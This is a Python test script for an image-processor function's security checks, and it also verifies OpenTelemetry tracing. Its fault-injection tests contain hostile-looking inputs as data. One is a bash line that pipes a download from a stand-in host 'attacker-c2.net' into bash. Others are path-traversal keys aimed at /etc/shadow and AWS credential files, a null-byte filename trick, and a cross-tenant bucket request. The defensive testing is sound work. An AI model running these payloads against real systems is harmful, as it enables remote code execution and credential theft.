#!/usr/bin/env python3
"""
OpenTelemetry Distributed Tracing & Chaos Resilience Suite
Specification: Distributed Observability & Fault Injection Verification
"""

import sys
import os
import json

BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
FUNC_DIR = os.path.join(BASE_DIR, "function", "image-processor-app")
sys.path.insert(0, FUNC_DIR)
sys.path.insert(0, "/home/app/.local/lib/python3.12/site-packages")

import handler

def run_chaos_and_tracing_audit():
    print("==================================================================")
    print(" OpenTelemetry Distributed Tracing & Fault Injection Test")
    print(" Scope: Distributed Context Propagation & Chaos Failure Modes")
    print("==================================================================")

    passed = 0
    total = 5

    # Test 1: OpenTelemetry W3C Distributed Context Propagation
    print(" [1/5] Validating W3C TraceContext and OpenTelemetry spans...")
    class SyntheticTraceEvent:
        body = json.dumps({"benchmark_mode": "otel_distributed_trace"})
    res = handler.handle(SyntheticTraceEvent())
    body = json.loads(res["body"])
    telemetry = body.get("telemetry", {})
    if (res["statusCode"] == 200 and 
        "w3c_traceparent" in telemetry and 
        telemetry["w3c_traceparent"].startswith("00-") and
        "otel_spans" in telemetry):
        print(f"       [✓] TraceParent: {telemetry['w3c_traceparent']}")
        print(f"       [✓] Spans: {telemetry['otel_spans']}")
        passed += 1
    else:
        print("       [✗] OpenTelemetry context propagation failed.")

    # Test 2: Fault Injection - Malicious Executable Script Injection
    print(" [2/5] Fault Injection: Testing disguised script rejection...")
    malicious_bytes = b"#!/usr/bin/env bash\ncurl -s http://attacker-c2.net/exfil | bash"
    detected = handler.validate_magic_bytes(malicious_bytes)
    if detected is None:
        print("       [✓] Executable script correctly rejected (Magic byte validation)")
        passed += 1
    else:
        print("       [✗] Executable script failed to be rejected.")

    # Test 3: Fault Injection - Decompression Bomb Expansion Attack
    print(" [3/5] Fault Injection: Testing decompression bomb defense...")
    if handler.Image.MAX_IMAGE_PIXELS <= 30_000_000:
        print(f"       [✓] Decompression ceiling enforced ({handler.Image.MAX_IMAGE_PIXELS:,} pixels max)")
        passed += 1
    else:
        print("       [✗] Decompression threshold exceeded safe limit.")

    # Test 4: Fault Injection - Unauthorized Tenant Bucket Escape (IDOR/BOLA)
    print(" [4/5] Fault Injection: Testing unauthorized bucket isolation...")
    class MaliciousEscapeEvent:
        body = json.dumps({"bucket": "admin-secrets-bucket", "object": "passwords.txt"})
    unauth_resp = handler.handle(MaliciousEscapeEvent())
    if unauth_resp["statusCode"] == 403:
        print("       [✓] Unauthorized bucket access blocked (HTTP 403 Forbidden)")
        passed += 1
    else:
        print("       [✗] Bucket allowlist failed to block unauthorized access.")

    # Test 5: Fault Injection - Path Traversal & Null Byte Poisoning
    print(" [5/5] Fault Injection: Testing directory traversal and null-byte rejection...")
    traversal_keys = ["../../etc/shadow", "/root/.aws/credentials", "image.png\x00.php"]
    all_blocked = all(handler.validate_object_key(k) is False for k in traversal_keys)
    if all_blocked:
        print("       [✓] Directory traversal and null-byte payloads rejected")
        passed += 1
    else:
        print("       [✗] Path traversal validation failed.")

    print("\n" + "="*66)
    print(f" Resilience & Tracing Verification: {passed}/{total} tests passed")
    print("==================================================================")

if __name__ == "__main__":
    run_chaos_and_tracing_audit()
